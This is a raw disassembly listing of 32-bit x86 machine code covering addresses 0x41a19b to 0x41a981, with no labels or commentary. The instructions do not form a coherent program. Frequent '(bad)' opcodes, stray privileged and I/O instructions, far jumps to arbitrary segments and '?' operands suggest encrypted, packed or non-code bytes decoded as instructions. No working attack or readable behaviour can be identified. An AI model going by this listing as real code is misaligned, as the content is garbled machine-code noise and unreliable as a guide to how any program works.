  41a19b:	or     ah,BYTE PTR [edx]
  41a19d:	popf   
  41a19e:	xor    BYTE PTR [esi],dh
  41a1a0:	dec    ecx
  41a1a1:	dec    ebp
  41a1a2:	mov    ah,0xad
  41a1a4:	or     ecx,DWORD PTR [edx]
  41a1a6:	jp     0x41a152
  41a1a8:	stos   DWORD PTR es:[edi],eax
  41a1a9:	sub    eax,0x35244b6d
  41a1ae:	jg     0x41a204
  41a1b0:	mov    ds:0x363d9ea7,al
  41a1b5:	test   al,0x77
  41a1b7:	(bad)  
  41a1b8:	std    
  41a1b9:	fdivr  QWORD PTR [ecx+0x5c]
  41a1bc:	add    BYTE PTR [esi+0x710f1b41],dl
  41a1c2:	xchg   BYTE PTR [ecx+0x22],ch
  41a1c5:	stos   BYTE PTR es:[edi],al
  41a1c6:	out    dx,eax
  41a1c7:	adc    edx,DWORD PTR [eax+0xcb970d2]
  41a1cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a1ce:	inc    ecx
  41a1cf:	ret    0x9118
  41a1d2:	pop    ebx
  41a1d3:	leave  
  41a1d4:	fadd   QWORD PTR ss:[ecx-0x39a4e75b]
  41a1db:	mov    edi,0xa5420192
  41a1e0:	mov    bl,0x9a
  41a1e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a1e3:	into   
  41a1e4:	lods   eax,DWORD PTR ds:[esi]
  41a1e5:	jmp    0xe684833e
  41a1ea:	mov    ecx,0xd87a163c
  41a1ef:	sti    
  41a1f0:	jns    0x41a1a4
  41a1f2:	aad    0x31
  41a1f4:	mov    esp,0x45ab774c
  41a1f9:	inc    ebx
  41a1fa:	bound  esi,QWORD PTR [edx-0x18]
  41a1fd:	out    0x4c,al
  41a1ff:	or     ebp,esp
  41a201:	fidivr WORD PTR ds:0x7dc886f2
  41a207:	sub    DWORD PTR [edi+0x7da68644],ebx
  41a20d:	fadd   QWORD PTR [ebx-0x6870d5ba]
  41a213:	call   0xb0c8:0xa2d3e987
  41a21a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a21b:	jge    0x41a1a9
  41a21d:	adc    ah,BYTE PTR [ecx]
  41a21f:	push   DWORD PTR [edi]
  41a221:	aam    0x7d
  41a223:	(bad)  
  41a224:	cmp    al,0xd
  41a226:	and    ebx,DWORD PTR gs:[ecx]
  41a229:	arpl   sp,di
  41a22b:	mov    esi,0x19f9d21a
  41a230:	pop    ebx
  41a231:	add    al,0x64
  41a233:	je     0x41a260
  41a235:	pop    ds
  41a236:	inc    edx
  41a237:	sbb    edi,DWORD PTR [eax-0x7]
  41a23a:	and    DWORD PTR [esi+0x452277d2],edi
  41a240:	jns    0x41a2a2
  41a242:	pop    esi
  41a243:	pop    esi
  41a244:	inc    esp
  41a245:	cmp    al,0x64
  41a247:	dec    esi
  41a248:	xor    esp,DWORD PTR ds:0x4e5a5d7f
  41a24e:	xchg   cl,al
  41a250:	ss sti 
  41a252:	inc    esp
  41a253:	ins    DWORD PTR es:[edi],dx
  41a254:	mov    dh,0x22
  41a256:	pop    ss
  41a257:	adc    ebp,DWORD PTR [eax]
  41a259:	fidiv  WORD PTR [ebp-0x22]
  41a25c:	jb     0x41a21c
  41a25e:	dec    edx
  41a25f:	sub    edx,DWORD PTR [ebx+0x40]
  41a262:	stos   BYTE PTR es:[edi],al
  41a263:	xor    ebx,ecx
  41a265:	mov    ah,0x71
  41a267:	or     al,BYTE PTR [edx]
  41a269:	xor    cl,BYTE PTR [edi-0x2da6caa8]
  41a26f:	xchg   DWORD PTR [esi],esi
  41a271:	loopne 0x41a2c5
  41a273:	mov    ah,0xcd
  41a275:	ret    
  41a276:	dec    esp
  41a277:	push   0x7f
  41a279:	mov    cl,0x9f
  41a27b:	inc    edx
  41a27c:	xor    al,0x35
  41a27e:	adc    al,0xaa
  41a280:	cmp    DWORD PTR [ebp-0x3c94bb2c],ecx
  41a286:	sbb    ch,BYTE PTR [ecx+0x54]
  41a289:	push   ds
  41a28a:	push   ss
  41a28b:	pop    ds
  41a28c:	adc    BYTE PTR [esi],dh
  41a28e:	xor    eax,0x9f089635
  41a293:	retf   
  41a294:	std    
  41a295:	cmp    ecx,DWORD PTR [esi*1-0x39a4f904]
  41a29c:	adc    cl,BYTE PTR [eax+ebx*4-0x3e]
  41a2a0:	ret    0x4005
  41a2a3:	dec    esi
  41a2a4:	into   
  41a2a5:	pop    es
  41a2a6:	loop   0x41a2b3
  41a2a8:	loopne 0x41a2af
  41a2aa:	inc    esi
  41a2ab:	in     al,dx
  41a2ac:	jmp    0xfa36:0x6cc06dde
  41a2b3:	les    ebp,FWORD PTR [edx-0x39296b40]
  41a2b9:	xchg   esp,eax
  41a2ba:	call   0xeb53:0x15a28f9f
  41a2c1:	and    esp,eax
  41a2c3:	mov    ch,0xa0
  41a2c5:	mov    al,ds:0xcd40cd20
  41a2ca:	inc    ebx
  41a2cb:	test   eax,0xdb1b731e
  41a2d0:	ins    BYTE PTR es:[edi],dx
  41a2d1:	xchg   edi,eax
  41a2d2:	mov    edx,DWORD PTR [edi-0x54]
  41a2d5:	and    ecx,edi
  41a2d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a2d8:	into   
  41a2d9:	test   eax,0x9d692bf6
  41a2de:	lods   al,BYTE PTR ds:[esi]
  41a2df:	sbb    ebp,ebp
  41a2e1:	mov    eax,0xd07f48d4
  41a2e6:	adc    DWORD PTR [ebp+0x21],ebx
  41a2e9:	jne    0xf2574ef8
  41a2ef:	(bad)  
  41a2f0:	or     eax,0x14b7c588
  41a2f5:	push   ebp
  41a2f6:	out    0x74,eax
  41a2f8:	inc    edi
  41a2f9:	lock sub DWORD PTR [edx],ebp
  41a2fc:	scas   al,BYTE PTR es:[edi]
  41a2fd:	icebp  
  41a2fe:	scas   eax,DWORD PTR es:[edi]
  41a2ff:	neg    BYTE PTR [ebx-0x714cc6a7]
  41a305:	jae    0x41a2cc
  41a307:	cdq    
  41a308:	scas   eax,DWORD PTR es:[edi]
  41a309:	imul   esp,DWORD PTR fs:[esi+0x5a],0x7a
  41a30e:	push   ebp
  41a30f:	mov    gs,esi
  41a311:	(bad)  
  41a312:	dec    BYTE PTR [ebp+0x343f51f9]
  41a318:	and    DWORD PTR [edi-0xb734717],ebx
  41a31e:	push   0xc2b6a786
  41a323:	mov    ah,0x3
  41a325:	jo     0x41a38a
  41a327:	mov    al,ds:0x12ea2fbb
  41a32c:	pushf  
  41a32d:	dec    esp
  41a32e:	and    eax,0x302e4f31
  41a333:	mov    ebx,0x375ff0f9
  41a338:	cli    
  41a339:	in     al,0xb1
  41a33b:	cmp    ebx,DWORD PTR [esi+0x4b66333f]
  41a341:	sbb    eax,DWORD PTR [eax]
  41a343:	jnp    0x41a2d6
  41a345:	mov    ds:0xf6d937d1,eax
  41a34a:	pop    esp
  41a34b:	xor    ah,cl
  41a34d:	mov    ds:0xc41e6afa,eax
  41a352:	xchg   BYTE PTR ds:0x6a65853,dl
  41a358:	in     eax,0xbb
  41a35a:	iret   
  41a35b:	(bad)
  41a35e:	jge    0x41a307
  41a360:	mov    WORD PTR [ecx-0x47befae8],?
  41a366:	nop
  41a367:	push   eax
  41a368:	add    DWORD PTR [esi],ebx
  41a36a:	clc    
  41a36b:	pop    ss
  41a36c:	dec    ebp
  41a36d:	outs   dx,DWORD PTR ds:[esi]
  41a36e:	pop    edi
  41a36f:	or     dl,BYTE PTR [ecx]
  41a371:	icebp  
  41a372:	test   al,0xfa
  41a374:	lods   eax,DWORD PTR ds:[esi]
  41a375:	jmp    0x1a07ae48
  41a37a:	sub    BYTE PTR [esi],cl
  41a37c:	jmp    esi
  41a37e:	fwait
  41a37f:	or     BYTE PTR [eax-0x3a],bl
  41a382:	xchg   esi,eax
  41a383:	pop    eax
  41a384:	xchg   esi,eax
  41a385:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a386:	hlt    
  41a387:	out    dx,al
  41a388:	cli    
  41a389:	outs   dx,BYTE PTR ds:[esi]
  41a38a:	clc    
  41a38b:	call   0xccc6:0x5d17e479
  41a392:	xchg   ebp,eax
  41a393:	and    bh,BYTE PTR [ecx+0x6ceac56e]
  41a399:	dec    ebp
  41a39a:	call   0xeb6a:0x262e71ff
  41a3a1:	sbb    BYTE PTR fs:[ebx+0x17],dl
  41a3a5:	sub    BYTE PTR [ecx-0x35],dl
  41a3a8:	mov    dh,0x4f
  41a3aa:	sub    DWORD PTR [ecx+0x63546c92],edx
  41a3b0:	leave  
  41a3b1:	js     0x41a42c
  41a3b3:	dec    DWORD PTR [edi-0x3aaf4cf1]
  41a3b9:	std    
  41a3ba:	pop    edi
  41a3bb:	jl     0x41a402
  41a3bd:	push   edx
  41a3be:	outs   dx,DWORD PTR ds:[esi]
  41a3bf:	fcmove st,st(2)
  41a3c1:	pop    ds
  41a3c2:	loopne 0x41a3ce
  41a3c4:	jmp    0x18d8:0xedf591b3
  41a3cb:	adc    al,0x96
  41a3cd:	test   DWORD PTR [edi+0x76],ebx
  41a3d0:	mov    ch,0x51
  41a3d2:	nop
  41a3d3:	ret    0x370e
  41a3d6:	push   0x5eb4c6c
  41a3db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a3dc:	mov    ch,BYTE PTR [edi-0x2e]
  41a3df:	mov    eax,0x565e35bb
  41a3e4:	repz cmp edi,DWORD PTR [esi+0x1a91ca22]
  41a3eb:	sub    ch,0xc7
  41a3ee:	repz mov esi,0xfbdfd289
  41a3f4:	popa   
  41a3f5:	sbb    ch,al
  41a3f7:	jmp    0x798a:0x2682dd15
  41a3fe:	push   0x4c
  41a400:	mov    dl,0x6d
  41a402:	test   al,0x22
  41a404:	scas   al,BYTE PTR es:[edi]
  41a405:	or     edi,esi
  41a407:	rcr    DWORD PTR [ecx+esi*1-0x308e267d],0xea
  41a40f:	push   0x2633c9ed
  41a414:	arpl   sp,si
  41a416:	(bad)  [edx-0x34]
  41a419:	jl     0x41a44e
  41a41b:	rcl    ch,0x7e
  41a41e:	pusha  
  41a41f:	adc    al,0x1c
  41a421:	sub    al,bh
  41a423:	xor    ch,BYTE PTR [esi]
  41a425:	cmp    BYTE PTR [ebp-0x14857b08],al
  41a42b:	fisubr WORD PTR ds:0x7443af3f
  41a431:	dec    ecx
  41a432:	push   edi
  41a433:	xchg   edx,eax
  41a434:	ret    0x2cfd
  41a437:	ret    
  41a438:	test   DWORD PTR ds:0xdbe751fe,ecx
  41a43e:	adc    al,0x6d
  41a440:	cwde   
  41a441:	out    dx,al
  41a442:	pop    eax
  41a443:	mov    dl,0x2b
  41a445:	adc    BYTE PTR [ecx+0x37fadea0],dl
  41a44b:	repnz mov es,WORD PTR [esi+0x7d]
  41a44f:	popf   
  41a450:	cmp    ebp,DWORD PTR [ebx]
  41a452:	cld    
  41a453:	(bad)  
  41a454:	lods   al,BYTE PTR ds:[esi]
  41a455:	add    ebx,edi
  41a457:	lods   eax,DWORD PTR ds:[esi]
  41a458:	and    ebx,ebx
  41a45a:	xchg   BYTE PTR [edi],dl
  41a45c:	hlt    
  41a45d:	(bad)  
  41a45e:	aas    
  41a45f:	jbe    0x41a447
  41a461:	or     eax,0x6963ec43
  41a466:	xor    al,0x7c
  41a468:	xor    bh,dh
  41a46a:	neg    BYTE PTR [ebp-0x6d]
  41a46d:	pusha  
  41a46e:	pop    ebp
  41a46f:	mov    ebp,0x95fc1a3d
  41a474:	xor    al,0x89
  41a476:	fst    DWORD PTR [edx+0x5]
  41a479:	pop    ss
  41a47a:	and    BYTE PTR [ebp+eax*4-0x722234e9],ch
  41a481:	push   esi
  41a482:	add    dl,BYTE PTR [edi-0x65]
  41a485:	mov    eax,DWORD PTR ds:0x8ff877ef
  41a48b:	rcr    bl,cl
  41a48d:	into   
  41a48e:	jnp    0x41a46a
  41a490:	jg     0x41a4d7
  41a492:	retf   
  41a493:	in     al,0xb9
  41a495:	shr    DWORD PTR [ecx],1
	...
  41a513:	add    BYTE PTR [esi-0x77],bl
  41a516:	add    eax,0x7feed766
  41a51b:	mov    ecx,0x4f6277d8
  41a520:	(bad)  
  41a521:	aaa    
  41a522:	mov    bl,0x13
  41a524:	mov    bl,0x44
  41a526:	add    DWORD PTR [eax],eax
  41a528:	imul   eax,DWORD PTR [edi],0x0
  41a52b:	add    BYTE PTR [edx+edx*4+0x60],ah
  41a52f:	xchg   DWORD PTR [ebx],ebp
  41a531:	add    al,0x75
  41a533:	ja     0x41a4ef
  41a535:	aas    
  41a536:	ins    BYTE PTR es:[edi],dx
  41a537:	jnp    0x41a515
  41a539:	pop    esp
  41a53a:	xchg   edx,eax
  41a53b:	fadd   DWORD PTR ds:0x860f697e
  41a541:	dec    esi
  41a542:	stos   DWORD PTR es:[edi],eax
  41a543:	mov    BYTE PTR [edx],al
  41a545:	ins    DWORD PTR es:[edi],dx
  41a546:	rcr    BYTE PTR [esp+edx*4-0x50],1
  41a54a:	ins    BYTE PTR es:[edi],dx
  41a54b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a54c:	fistp  WORD PTR [eax-0xe]
  41a54f:	push   edi
  41a550:	loope  0x41a5b5
  41a552:	sahf   
  41a553:	fisttp WORD PTR [esi-0x6de9bf60]
  41a559:	(bad)  
  41a55a:	into   
  41a55b:	outs   dx,BYTE PTR ds:[esi]
  41a55c:	mov    edx,0xddc19c85
  41a561:	es inc esp
  41a563:	mov    esp,0x76d3ca93
  41a568:	push   cs
  41a569:	imul   ebx,DWORD PTR [esi+eiz*2+0x3],0xffffff90
  41a56e:	xchg   ebp,eax
  41a56f:	mov    ebp,0xc6b99d38
  41a574:	popa   
  41a575:	cmp    BYTE PTR [eax],dl
  41a577:	out    0x78,eax
  41a579:	les    esi,FWORD PTR [ebx+0x1a9736bc]
  41a57f:	js     0x41a508
  41a581:	into   
  41a582:	hlt    
  41a583:	push   esp
  41a584:	mov    ebp,0x875be793
  41a589:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a58a:	fisub  WORD PTR [edx]
  41a58c:	add    esp,DWORD PTR [edi-0x24]
  41a58f:	sar    DWORD PTR [ecx+0x4f],cl
  41a592:	loope  0x41a5c6
  41a594:	dec    ebx
  41a595:	das    
  41a596:	pop    esp
  41a597:	pop    eax
  41a598:	jno    0x41a581
  41a59a:	cmp    cl,dh
  41a59c:	dec    ecx
  41a59d:	cmp    al,0x6
  41a59f:	mov    BYTE PTR [ebx-0xe07e9fb],dh
  41a5a5:	mov    BYTE PTR [eax],dl
  41a5a7:	jl     0x41a5f0
  41a5a9:	or     eax,0x2511a732
  41a5ae:	jbe    0x41a627
  41a5b0:	pop    edi
  41a5b1:	popf   
  41a5b2:	ret    0xf8e4
  41a5b5:	test   BYTE PTR [edi+0x8],dh
  41a5b8:	jno    0x41a593
  41a5ba:	push   edi
  41a5bb:	sbb    BYTE PTR ds:0x54b0f00b,ch
  41a5c1:	mov    eax,ds:0x32f453e
  41a5c6:	push   es
  41a5c7:	cmp    DWORD PTR [edi-0x70],ebp
  41a5ca:	dec    esp
  41a5cb:	xchg   ecx,eax
  41a5cc:	pop    esi
  41a5cd:	xor    DWORD PTR [eax],ebp
  41a5cf:	into   
  41a5d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a5d1:	ss pop edi
  41a5d3:	mov    bl,0x55
  41a5d5:	mov    esp,gs
  41a5d7:	icebp  
  41a5d8:	push   0xbc5aae7a
  41a5dd:	xor    al,0x39
  41a5df:	inc    ebx
  41a5e0:	ret    
  41a5e1:	call   0x54c1721c
  41a5e6:	ds jmp 0x41a654
  41a5e9:	mov    esi,0x4fccd46c
  41a5ee:	sbb    BYTE PTR [esi+esi*2-0x1f],0x95
  41a5f3:	sar    BYTE PTR [eax-0x59],1
  41a5f6:	mov    ebx,0x96f309b9
  41a5fb:	jmp    0xcc4d:0x1c257a5b
  41a602:	dec    edx
  41a603:	dec    esi
  41a604:	sbb    ebp,ebp
  41a606:	fsubr  DWORD PTR [ebx+0x35]
  41a609:	aas    
  41a60a:	push   ds
  41a60b:	xchg   ebp,eax
  41a60c:	push   ecx
  41a60d:	cmp    DWORD PTR [esi+ebx*2+0x4fe9dbbf],edi
  41a614:	push   cs
  41a615:	xor    al,0xd7
  41a617:	adc    BYTE PTR [esp+edx*1+0x1c5e27ef],ch
  41a61e:	cli    
  41a61f:	xchg   ebx,eax
  41a620:	mov    ds:0xc7453b40,eax
  41a625:	call   0x2c8b:0x1a79d825
  41a62c:	sbb    DWORD PTR [ecx],eax
  41a62e:	fadd   QWORD PTR [esi+eiz*8]
  41a631:	jns    0x41a630
  41a633:	aam    0x73
  41a635:	mov    BYTE PTR [edi],dh
  41a637:	xor    eax,0x4e34b5f0
  41a63c:	hlt    
  41a63d:	outs   dx,BYTE PTR ds:[esi]
  41a63e:	mov    al,BYTE PTR [ecx+0x1]
  41a641:	lahf   
  41a642:	rcr    DWORD PTR [edi-0x69200e61],1
  41a648:	aad    0xdd
  41a64a:	(bad)  
  41a64c:	pop    esi
  41a64d:	mov    esi,DWORD PTR [edx-0x6761e15]
  41a653:	scas   al,BYTE PTR es:[edi]
  41a654:	les    esp,FWORD PTR [eax]
  41a656:	lea    edx,[edi-0x1618cca4]
  41a65c:	pusha  
  41a65d:	rol    DWORD PTR [eax],1
  41a65f:	adc    eax,0xd6d85ab3
  41a664:	sub    eax,0x4c8085ea
  41a669:	int    0x58
  41a66b:	add    BYTE PTR [ecx],0x36
  41a66e:	clc    
  41a66f:	jns    0x41a61c
  41a671:	out    dx,al
  41a672:	jno    0x41a5f5
  41a674:	pusha  
  41a675:	mov    ds:0x5ca57893,al
  41a67a:	sbb    BYTE PTR [edi+0x26],ah
  41a67d:	xchg   BYTE PTR [ebx-0x745b18],al
  41a683:	cdq    
  41a684:	add    BYTE PTR [ebp+ebx*4-0x6b767d2b],cl
  41a68b:	sbb    BYTE PTR [edi+0x61],dh
  41a68e:	sbb    ecx,edi
  41a690:	ss jecxz 0x41a61d
  41a693:	jae    0x41a693
  41a695:	lea    edi,[ebx+0x63]
  41a698:	mov    esi,DWORD PTR [ebp+0x61]
  41a69b:	jecxz  0x41a61e
  41a69d:	add    bl,bh
  41a69f:	jno    0x41a68f
  41a6a1:	inc    ebx
  41a6a2:	push   eax
  41a6a3:	popf   
  41a6a4:	shl    DWORD PTR [ecx-0x7c04383c],1
  41a6aa:	mov    ecx,0xfc95a734
  41a6af:	mov    bh,0x44
  41a6b1:	push   ebx
  41a6b2:	mov    ebp,0x6cb5c46
  41a6b7:	jae    0x41a694
  41a6b9:	popa   
  41a6ba:	and    al,0x3e
  41a6bd:	add    DWORD PTR [ebp+ebp*8+0x277b4f4b],0xffffffec
  41a6c5:	stc    
  41a6c6:	add    BYTE PTR [ebx-0x57],ch
  41a6c9:	aam    0xa1
  41a6cb:	fnsave [edi+0xddeae71]
  41a6d1:	arpl   WORD PTR [ecx],di
  41a6d3:	and    ebp,ecx
  41a6d5:	push   eax
  41a6d6:	inc    ebx
  41a6d7:	add    eax,0x99f01e1f
  41a6dc:	loope  0x41a746
  41a6de:	mov    edx,0x6406b91c
  41a6e3:	inc    edi
  41a6e4:	inc    ebp
  41a6e5:	daa    
  41a6e6:	xor    esi,eax
  41a6e8:	sahf   
  41a6e9:	into   
  41a6ea:	mov    bl,0xc6
  41a6ec:	(bad)  
  41a6ee:	and    bl,ch
  41a6f0:	xchg   ebx,eax
  41a6f1:	push   edi
  41a6f2:	or     al,0x9b
  41a6f4:	retf   0x6b71
  41a6f7:	push   edx
  41a6f8:	(bad)  
  41a6f9:	fcmove st,st(4)
  41a6fb:	cmovl  esi,DWORD PTR [ebp+0x79eabff5]
  41a702:	(bad)  
  41a703:	shr    DWORD PTR [ebp+0x55],0xe9
  41a707:	jp     0x41a769
  41a709:	mov    ?,WORD PTR [eax+ebp*1-0x1f]
  41a70d:	dec    ebx
  41a70e:	(bad)
  41a711:	and    dh,BYTE PTR [ebp-0x511815e0]
  41a717:	ins    BYTE PTR es:[edi],dx
  41a718:	stc    
  41a719:	mov    al,BYTE PTR [edi-0x42]
  41a71c:	xor    DWORD PTR ds:[ebp-0x4a83d653],ecx
  41a723:	dec    DWORD PTR ds:[ebp+0x2cc905a3]
  41a72a:	call   0xdaf3:0x87df9ffc
  41a731:	retf   
  41a732:	push   ecx
  41a733:	mov    cl,0x61
  41a735:	dec    esi
  41a736:	jbe    0x41a6f0
  41a738:	xchg   esp,eax
  41a739:	mov    al,0x2c
  41a73b:	sbb    al,0xa7
  41a73d:	and    cl,BYTE PTR [ebx]
  41a73f:	rol    eax,cl
  41a741:	adc    BYTE PTR [eax-0x76],0xd2
  41a745:	mov    al,0x1b
  41a747:	mov    ebx,0xd73b837f
  41a74c:	mov    dl,0x45
  41a74e:	pop    esp
  41a74f:	dec    esi
  41a750:	bound  esp,QWORD PTR [ebx+0x2637e552]
  41a756:	mov    ecx,0x58c813c7
  41a75b:	aaa    
  41a75c:	icebp  
  41a75d:	jmp    0x41a716
  41a75f:	fsubr  QWORD PTR [edi]
  41a761:	pop    ds
  41a762:	ret    
  41a763:	ja     0x41a74c
  41a765:	aas    
  41a766:	cmp    DWORD PTR [eax+0x541cabc0],esi
  41a76c:	les    ebp,FWORD PTR ds:0xd39f60f2
  41a772:	icebp  
  41a773:	hlt    
  41a774:	cs jns 0x41a6fc
  41a777:	pusha  
  41a778:	dec    ecx
  41a779:	xchg   edi,eax
  41a77a:	mov    ss,WORD PTR ds:0x2c5af970
  41a780:	iret   
  41a781:	fnstcw WORD PTR [edx-0x29]
  41a784:	int    0x52
  41a786:	cmp    ch,ch
  41a788:	sbb    bl,BYTE PTR es:[ebp-0x50]
  41a78c:	xchg   esi,eax
  41a78d:	xchg   ebx,eax
  41a78e:	stos   BYTE PTR es:[edi],al
  41a78f:	xchg   ecx,eax
  41a790:	push   DWORD PTR [ebx]
  41a792:	and    eax,0x6065ad6a
  41a797:	and    eax,edx
  41a799:	mul    BYTE PTR [ecx+edx*2+0x3d]
  41a79d:	in     al,0xbf
  41a79f:	cmc    
  41a7a0:	test   al,0xb2
  41a7a2:	mov    edi,0xffb11c5c
  41a7a7:	pop    ecx
  41a7a8:	pop    ebx
  41a7a9:	and    esi,DWORD PTR [esi]
  41a7ab:	retf   0xd0fc
  41a7ae:	stos   DWORD PTR es:[edi],eax
  41a7af:	dec    esp
  41a7b0:	leave  
  41a7b1:	in     eax,0x8
  41a7b3:	sub    ebx,DWORD PTR [ecx]
  41a7b5:	dec    edi
  41a7b6:	sbb    al,0x3d
  41a7b8:	ret    
  41a7b9:	adc    DWORD PTR [ecx],edi
  41a7bb:	and    dl,BYTE PTR [ebp-0x4f23b949]
  41a7c1:	sbb    BYTE PTR [edx-0x7674586c],0x1
  41a7c8:	mov    DWORD PTR [esi+esi*2],eax
  41a7cb:	sbb    eax,0x1b91aee1
  41a7d0:	jmp    0x5523:0x50aeb6a4
  41a7d7:	jecxz  0x41a817
  41a7d9:	test   al,0x6e
  41a7db:	out    0xf2,eax
  41a7dd:	jmp    FWORD PTR [edi+0x26]
  41a7e0:	xor    DWORD PTR [edi],ebp
  41a7e2:	ins    BYTE PTR es:[edi],dx
  41a7e3:	add    esp,0x22019a5d
  41a7e9:	lahf   
  41a7ea:	aad    0xcc
  41a7ec:	addr16 mov ch,0x74
  41a7ef:	das    
  41a7f0:	jecxz  0x41a7bd
  41a7f2:	and    dl,BYTE PTR [ebp-0xb893d21]
  41a7f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a7f9:	mov    dl,BYTE PTR [edx-0x23]
  41a7fc:	dec    esi
  41a7fd:	inc    esp
  41a7fe:	sysret 
  41a800:	push   edx
  41a801:	popa   
  41a802:	ds popf 
  41a804:	sbb    BYTE PTR [ecx],dl
  41a806:	sbb    al,BYTE PTR [edx]
  41a808:	loope  0x41a80f
  41a80a:	inc    edx
  41a80b:	fistp  QWORD PTR [eax-0x783e52f9]
  41a811:	not    DWORD PTR [ebp-0x15]
  41a814:	jno    0x41a854
  41a816:	cli    
  41a817:	lods   al,BYTE PTR ds:[esi]
  41a818:	enter  0x3a90,0x29
  41a81c:	mov    eax,0x63ac0cbc
  41a821:	test   al,0x2e
  41a823:	retf   
  41a824:	jge    0x41a89e
  41a826:	loope  0x41a7ea
  41a828:	in     eax,dx
  41a829:	add    eax,0x5274bcfd
  41a82e:	fwait
  41a82f:	in     eax,dx
  41a830:	cmp    bl,BYTE PTR ds:0x3762
  41a835:	xchg   ebx,eax
  41a836:	pop    esi
  41a837:	cwde   
  41a838:	jns    0x41a831
  41a83a:	push   cs
  41a83b:	es mov edi,0x838446c3
  41a841:	pop    ebp
  41a842:	int    0x86
  41a844:	out    0x17,eax
  41a846:	dec    esp
  41a847:	or     al,0x8
  41a849:	stos   BYTE PTR es:[edi],al
  41a84a:	push   edi
  41a84b:	or     cl,BYTE PTR [edx-0x56]
  41a84e:	iret   
  41a84f:	ret    0xc80a
  41a852:	push   edi
  41a853:	dec    ebx
  41a854:	push   es
  41a855:	mov    cl,0x6a
  41a857:	jp     0x41a850
  41a859:	pop    ebp
  41a85a:	test   DWORD PTR [ecx+0x2a],esi
  41a85d:	pop    es
  41a85e:	iret   
  41a85f:	pop    esp
  41a860:	push   edi
  41a861:	mov    ah,0x51
  41a863:	js     0x41a888
  41a865:	xor    dh,BYTE PTR [eax+0x3]
  41a868:	jg     0x41a8e7
  41a86a:	jbe    0x41a8de
  41a86c:	sub    eax,DWORD PTR [esi-0x54c916fd]
  41a872:	ret    0x460c
  41a875:	retf   0x15b3
  41a878:	mov    BYTE PTR [ebx+0x672e33a4],cl
  41a87e:	cmp    al,0x8b
  41a880:	rcl    BYTE PTR [esi-0x54],cl
  41a883:	push   ds
  41a884:	mov    eax,ds:0x257852f1
  41a889:	push   esp
  41a88a:	xor    esp,esi
  41a88c:	xchg   edx,eax
  41a88d:	and    ah,BYTE PTR [ebp+0x6d]
  41a890:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a891:	bound  esp,QWORD PTR [ebp+0x5f74d202]
  41a897:	aad    0xa9
  41a899:	xchg   ebx,eax
  41a89a:	mov    ebp,0x754f9a7d
  41a89f:	inc    ecx
  41a8a0:	ret    
  41a8a1:	cli    
  41a8a2:	pop    ecx
  41a8a3:	outs   dx,DWORD PTR ds:[esi]
  41a8a4:	retf   
  41a8a5:	lds    ebp,FWORD PTR [ebp-0x46]
  41a8a8:	call   FWORD PTR [ebp+eax*4-0x2d9c2c48]
  41a8af:	jl     0x41a8a9
  41a8b1:	dec    ebx
  41a8b2:	fwait
  41a8b3:	sbb    edx,esi
  41a8b5:	sub    bh,dh
  41a8b7:	cmove  ebx,DWORD PTR [edi-0x50]
  41a8bb:	xlat   BYTE PTR ds:[ebx]
  41a8bc:	loopne 0x41a918
  41a8be:	pop    edi
  41a8bf:	sbb    eax,0x55ee4bab
  41a8c4:	xor    eax,0xac4faa7b
  41a8c9:	bound  esi,QWORD PTR gs:[ecx+0x17583e9]
  41a8d0:	addr16 sub eax,0x32d1c0d7
  41a8d6:	ror    DWORD PTR [esi],1
  41a8d8:	int3   
  41a8d9:	mov    esp,0xa0f10d51
  41a8de:	mov    eax,0x26944eb2
  41a8e3:	xor    eax,0x14bfffed
  41a8e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a8e9:	inc    eax
  41a8ea:	shr    esp,cl
  41a8ec:	out    dx,al
  41a8ed:	and    BYTE PTR [esp+edi*4],0x34
  41a8f1:	imul   ebx,DWORD PTR [edi-0x1b],0xffffff9c
  41a8f5:	cmp    cl,BYTE PTR [esi-0x8bd1798]
  41a8fb:	repz arpl WORD PTR [esi],bx
  41a8fe:	jbe    0x41a95e
  41a900:	(bad)  
  41a902:	ins    DWORD PTR es:[edi],dx
  41a903:	and    ebp,DWORD PTR [ebx-0x2a8b0d7b]
  41a909:	sbb    eax,0x9d6e43a8
  41a90e:	in     al,0x73
  41a910:	inc    edx
  41a911:	pop    edi
  41a912:	jb     0x41a965
  41a914:	in     eax,dx
  41a915:	dec    ebp
  41a916:	inc    esi
  41a917:	dec    ebp
  41a918:	mov    eax,0x55d7a233
  41a91d:	lods   al,BYTE PTR ds:[esi]
  41a91e:	xor    al,0x72
  41a920:	push   0x63eb347c
  41a925:	add    DWORD PTR [esi+0x23],esp
  41a928:	(bad)  
  41a92a:	jmp    0x41a8fd
  41a92c:	jns    0x41a8b1
  41a92e:	sbb    DWORD PTR [edi],eax
  41a930:	mov    DWORD PTR [edi+0x10933132],esi
  41a936:	in     eax,0x9d
  41a938:	sub    DWORD PTR [ebp*8+0x5f544d39],ecx
  41a93f:	popa   
  41a940:	sbb    ah,BYTE PTR [esi]
  41a942:	aam    0x75
  41a944:	shl    DWORD PTR [ecx+0x47],cl
  41a947:	cld    
  41a948:	std    
  41a949:	lds    edi,FWORD PTR [edx-0xda39b9e]
  41a94f:	mov    bh,0x96
  41a951:	jmp    0x41a8d9
  41a953:	scas   eax,DWORD PTR es:[edi]
  41a954:	add    bl,BYTE PTR [eax+edx*4-0x67]
  41a958:	retf   
  41a959:	inc    esi
  41a95a:	adc    ebp,DWORD PTR [edi-0x67e82318]
  41a960:	and    BYTE PTR [eax-0x4097d2cc],al
  41a966:	xchg   BYTE PTR [eax],dh
  41a968:	je     0x41a9b7
  41a96a:	fimul  WORD PTR [edi-0x113df102]
  41a970:	mov    dh,0x77
  41a972:	pushf  
  41a973:	or     al,0x8d
  41a975:	mov    esi,0xb634287f
  41a97a:	or     ch,BYTE PTR [ecx]
  41a97c:	push   ecx
  41a97d:	xchg   ebp,eax
  41a97e:	jnp    0x41a9d8
  41a980:	cdq    
  41a981:	(bad)  
